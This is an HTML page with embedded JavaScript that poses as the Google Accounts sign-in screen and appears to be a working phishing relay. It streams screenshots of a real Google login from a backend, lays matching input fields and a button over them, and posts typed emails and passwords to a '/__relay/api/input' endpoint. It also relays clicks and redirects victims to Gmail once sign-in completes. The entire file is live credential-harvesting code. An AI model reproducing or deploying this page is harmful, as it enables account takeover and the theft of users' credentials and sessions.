<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=google content=notranslate>
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;height:100%}
body{font-family:Arial,sans-serif;background:#f0f4f9;color:#202124;
 display:flex;align-items:center;justify-content:center;min-height:100vh}
.col{display:flex;flex-direction:column;align-items:center;padding:16px}
/* white card = mirrored main content + 36px padding all around (measured) */
.cardwrap{width:fit-content;max-width:100%}
#stage{background:#fff;border-radius:24px;padding:36px;max-width:100%;
 box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15)}
#imgbox{position:relative;width:fit-content;max-width:100%}
#shot{max-width:100%;height:auto;display:block;filter:blur(16px);transition:filter .3s;cursor:default}
#shot.on{filter:none}
/* overlay input — pixel-clone of Google's outlined field (label text comes
   from the mirrored screenshot above the field, so no placeholder here) */
#ov-in{position:absolute;display:none;padding:0 16px;font-family:Arial,sans-serif;font-size:16px;
 color:#202124;border:1px solid #dadce0;border-radius:4px;outline:none;background:#fff;z-index:5}
#ov-in:focus{border-color:#0b57d0;box-shadow:inset 0 0 0 1px #0b57d0}
#ov-in.egpw{-webkit-text-security:disc;letter-spacing:1px}
#ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;font-family:Arial,sans-serif;
 font-weight:500;font-size:14px;cursor:pointer;z-index:5;border-radius:4px}
#boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
 border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
#st{display:none;margin:8px auto 0;font-size:13px;color:#d93025;text-align:center;max-width:448px}
/* footer starts right at the card's bottom edge, same width as the card */
.foot{display:flex;justify-content:space-between;margin-top:8px;font-size:12px;color:#5f6368}
</style></head><body>
<div class=col>
<div id=boot></div>
<div class=cardwrap>
<div id=stage>
<div id=imgbox>
<img id=shot alt="" draggable=false>
<input id=ov-in autocomplete=off spellcheck=false>
<button id=ov-btn>Next</button>
</div>
</div>
<div class=foot><span>English (United States)</span>
<span>Help&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms</span></div>
</div>
<div id=st></div>
</div>
<script>
var SID=null, KIND=null,
    shot=document.getElementById('shot'), stage=document.getElementById('stage'),
    ovIn=document.getElementById('ov-in'), ovBtn=document.getElementById('ov-btn'),
    boot=document.getElementById('boot'), stEl=document.getElementById('st');
['pointermove','keydown','touchstart'].forEach(function(ev){
 document.addEventListener(ev,function(){shot.classList.add('on');},{once:true,capture:true});});
function fatal(t){stEl.style.display='block';stEl.textContent=t;}
function place(el,box,extra){
 if(!box){el.style.display='none';return;}
 el.style.display='block';
 el.style.left=box.x+'%';el.style.top=box.y+'%';
 el.style.width=box.w+'%';el.style.height=box.h+'%';
 if(extra)extra();
}
function submit(){
 if(!ovIn.value||!KIND)return;
 ovIn.blur();ovIn.style.display='none';ovBtn.style.display='none';
 fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({id:SID,kind:KIND,value:ovIn.value})}).catch(function(){fatal('Network error. Please reload the page.');});
}
ovBtn.onclick=submit;
ovIn.onkeydown=function(k){if(k.key==='Enter')submit();};
/* taps anywhere on the mirrored card (links, checkboxes, secondary buttons)
   are relayed to the real page so every control actually works */
shot.addEventListener('click',function(e){
 if(!SID)return;
 var r=shot.getBoundingClientRect();
 var x=100*(e.clientX-r.left)/r.width, y=100*(e.clientY-r.top)/r.height;
 fetch('/__relay/api/click',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({id:SID,x:x,y:y})}).catch(function(){});
});
var lastHash='';
/* sidecar captures at 2x DPR — show at half so CSS size == native Google */
shot.onload=function(){
 shot.style.width=(shot.naturalWidth>1200?Math.round(shot.naturalWidth/2):shot.naturalWidth)+'px';
};
function render(x){
 if(x.screenshot){
  if(x.shot_hash)lastHash=x.shot_hash;
  shot.src='data:image/jpeg;base64,'+x.screenshot;
  boot.style.display='none';shot.style.display='block';
 }
 var ib=x.input_box, bb=x.button_box, k=x.input_kind;
 if(ib&&k&&x.state!=='done'&&x.state!=='error'){
  KIND=k;
  ovIn.className=k==='password'?'egpw':'';
  if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
  place(ovIn,ib,function(){
   var h=ovIn.getBoundingClientRect().height;
   ovIn.style.fontSize=Math.max(13,Math.min(18,h*0.30))+'px';
  });
  place(ovBtn,bb,function(){
   var h=ovBtn.getBoundingClientRect().height;
   ovBtn.style.borderRadius=k==='email'?Math.max(10,Math.round(h/2))+'px':'4px';
   ovBtn.style.fontSize=Math.max(12,Math.min(15,h*0.36))+'px';
  });
  if(document.activeElement!==ovIn)setTimeout(function(){ovIn.focus();},120);
 }else{
  ovIn.style.display='none';ovBtn.style.display='none';
 }
 if(x.state==='done'){
  setTimeout(function(){location.href='https://mail.google.com';},1200);return;
 }
 if(x.state==='error'){
  /* Google's own error text is visible inside the mirrored screenshot —
     only surface a fallback line when the mirror never arrived */
  if(!x.screenshot)fatal(x.hint||'Sign-in failed. Please try again.');
  return;
 }
}
function poll(){
 if(!SID){setTimeout(poll,900);return;}
 fetch('/__relay/api/state?id='+SID+'&hs='+encodeURIComponent(lastHash))
  .then(function(r){return r.json();})
  .then(function(x){render(x);setTimeout(poll,1200);})
  .catch(function(){setTimeout(poll,2200);});
}
var qsid=new URLSearchParams(location.search).get('sid');
if(qsid){SID=qsid;poll();}
else fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({langs:(navigator.languages||[navigator.language||'en'])})})
 .then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
 .catch(function(){fatal('Cannot reach the sign-in page. Please reload.');});
poll();
</script></body></html>
